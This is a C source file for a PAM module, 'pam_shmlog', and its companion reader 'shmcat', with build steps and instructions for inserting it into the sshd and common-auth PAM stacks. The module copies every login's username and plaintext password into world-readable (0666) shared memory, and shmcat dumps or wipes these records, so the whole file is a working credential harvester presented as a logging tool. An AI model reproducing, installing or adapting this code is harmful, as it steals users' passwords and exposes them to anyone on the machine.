/**
 * Log authentication attempts to shared memory
 * NOTE: won't log password for non-existant users
 *
 * Build Linux:
 *   sudo apt-get install libpam-dev
 *   gcc -o pam_shmlog.so pam_shmlog.c -Wall -O2 -fPIC -lpam -shared -rdynamic
 *   gcc -o shmcat pam_shmlog.c -DSHMCAT -Wall
 *   sudo cp pam_shmlog.so /lib/x86_64-linux-gnu/security/
 *
 * Install Linux:
 *  If /etc/pam.d/common-auth looks like this
 *    auth  [success=1 default=ignore] pam_unix.so nullok_secure
 *    auth  requisite                  pam_deny.so
 *    auth  required                   pam_permit.so
 *    auth  ...
 *
 *  ..this means that PAM will:
 *  - skip the next 1 (success=1) module(s) in the stack if pam_unix succeeds
 *  - proceed with pam_deny.so, which always fails, if pam_unix didn't succeed
 *
 *  Since pam_unix.so does the actual authentication work we want to insert
 *  ourselves after it, which in practice means once before pam_deny.so and
 *  once after it.
 *  Here's a complete example with an updated success=N argument for pam_unix:
 *    auth  [success=2 default=ignore] pam_unix.so nullok_secure
 *    ### Call pam_shmlog when pam_unix fails (with an arbitrary tag "FAILED")
 *    auth  optional                   pam_shmlog.so  FAILED
 *    auth  requisite                  pam_deny.so
 *    ### Call pam_shmlog when pam_unix succeeded
 *    auth  optional                   pam_shmlog.so  SUCCEEDED
 *    auth  required                   pam_permit.so
 *    auth  ...
 *
 * Build OS X:
 *   gcc -o pam_shmlog.so pam_shmlog.c -Wall -O2 -fPIC -lpam --shared -lSystem
 *   gcc -o shmcat pam_shmlog.c -DSHMCAT -Wall
 *   sudo cp pam_shmlog.so /usr/lib/pam/
 *
 * Install OS X:
 *   Add 'auth optional pam_shmlog.so' before 'auth required ...'
 *   in /etc/pam.d/sshd
 *
 *
 * Displaying records in shared memory buffer:
 *   $ ./shmcat
 *   [*] 181 bytes in buffer (run with '-d' to zap)
 *   [2006-01-13 22:20:25] [sshd] nonexistant/
 *   INCORRECT rhost=localhost FAIL a b c
 *   [2006-01-13 22:20:45] [sshd] demo/12345 rhost=localhost FAIL a b c
 *   [2006-01-13 22:20:56] [sshd] demo/demo rhost=localhost SUCCESS
 *
 * Display only records generated since <UNIX timestamp>
 * and then delete (-d) the entire log:
 *   $ ./shmcat $(date -d '3 minute ago' +%s) -d
 *   [*] 181 bytes in buffer (run with '-d' to zap)
 *   [2006-01-13 22:20:45] [sshd] demo/12345 rhost=localhost FAIL a b c
 *   [2006-01-13 22:20:56] [sshd] demo/demo rhost=localhost SUCCESS
 *   [*] Zapped contents of log buffer
 *
 *
 * NOTE:
 * The IPC shared memory segment is chmod 666 and may be viewed by anyone.
 * It can be seen with the ipcs(1) command, like this:
 * $ ipcs -m
 * ------ Shared Memory Segments --------
 * 0x00000001 1474565    root       666        4096       0
 *
 * Delete it with ipcrm(1), where the -M argument is the SHMKEY id:
 * $ sudo ipcrm -M 1
 *
 */

#include <stdio.h>
#include <string.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <time.h>
#include <security/pam_appl.h>
#define PAM_SM_AUTH
#include <security/pam_modules.h>

/* an unique key - ipcs(1) shows it, so dont choose 0xc001b4b3 */
#define SHMKEY	0x01
/* size of the shared memory area */
#define SHMSIZE	(1024*1024)


#ifndef SHMCAT
PAM_EXTERN
int pam_sm_authenticate(pam_handle_t *h, int flags, int c, const char **v) {
	char *rhost, *svc, *user, *pass;
	int id, len, maxlen;
	void *base;
	time_t t;

	rhost = svc = user = pass = NULL;
	pam_get_item(h, PAM_RHOST, (void*)&rhost);
	pam_get_item(h, PAM_SERVICE, (void*)&svc);
	pam_get_item(h, PAM_USER, (void*)&user);
	pam_get_item(h, PAM_AUTHTOK, (void *)&pass);
	if(!user || !pass)
		return PAM_AUTHINFO_UNAVAIL;

	if((id = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL)) < 0)
		if((id = shmget(SHMKEY, SHMSIZE, 0)) < 0)
			return PAM_AUTHINFO_UNAVAIL;

	if((base = shmat(id, 0, 0)) == (void *)~0) {
		return PAM_AUTHINFO_UNAVAIL;
	}

	memmove(&maxlen, base, sizeof(int));
	memmove(&len, base+sizeof(int), sizeof(int));
	if(maxlen <= 0 || len <= 0 || len+256 > maxlen) {
		maxlen = SHMSIZE; len = 2*sizeof(int);
		memmove(base, &maxlen, sizeof(int));
		memmove(base+sizeof(int), &len, sizeof(int));
	}

	t = time(NULL);
	memmove(base+len, &t, sizeof(time_t)); len += sizeof(time_t);
	len += snprintf(base+len, maxlen-len,
					"[%s] %s/%s rhost=%s", svc, user, pass, rhost);
	while(c--)
		len += snprintf(base+len, maxlen-len, " %s", *v++);
	len += snprintf(base+len, maxlen-len, "\n") + 1;
	memmove(base+sizeof(int), &len, sizeof(int));
	shmdt(base);

	return PAM_SUCCESS;
}

PAM_EXTERN
int pam_sm_setcred(pam_handle_t *h, int flags, int c, const char **v) {
   return PAM_SUCCESS;
}


#else /* -DSHMCAT */
/**
 * Display contents of shared memory buffer
 * and optionally delete it.
 *
 * Usage:
 *   $ ./shmcat [since UNIX timestamp] [-d]
 *
 */
int main(int argc, char **argv) {
	int delete, len, id;
	char *base, *p;
	char buf[100];
	time_t since, t;

	if((id = shmget(SHMKEY, SHMSIZE, 0)) < 0) {
		perror("shmget()");
		return -1;
	}
	else if((base = p = shmat(id, 0, 0)) == (void *)~0) {
		perror("shmat()");
		return -1;
	}

	since = 0;
	delete = 0;
	if(argc == 2) sscanf(argv[1], "%zd", &since);
	while(argc--) if(!strcmp(argv[argc], "-d")) delete = 1;

	memmove(&len, base+sizeof(int), sizeof(int));
	fprintf(stderr, "[*] %d bytes in buffer (run with '-d' to zap)\n", len);
	p += 2*sizeof(int);
	while(p < base+len) {
		memmove(&t, p, sizeof(time_t)); p += sizeof(time_t);
		strftime(buf, sizeof(buf), "[%Y-%m-%d %H:%M:%S] ", localtime(&t));
		if(t >= since) fwrite(buf, strlen(buf), 1, stdout);
		while(p < base+len && *p != 0) {
			if(t >= since) fwrite(p, 1, 1, stdout);
			p++;
		}
		p++;
	}

	if(delete) {
		len = 0;
		memmove(base+sizeof(int), &len, sizeof(int));
		fprintf(stderr, "[*] Zapped contents of log buffer\n");
	}

	shmdt(base);
	return 0;
}
#endif
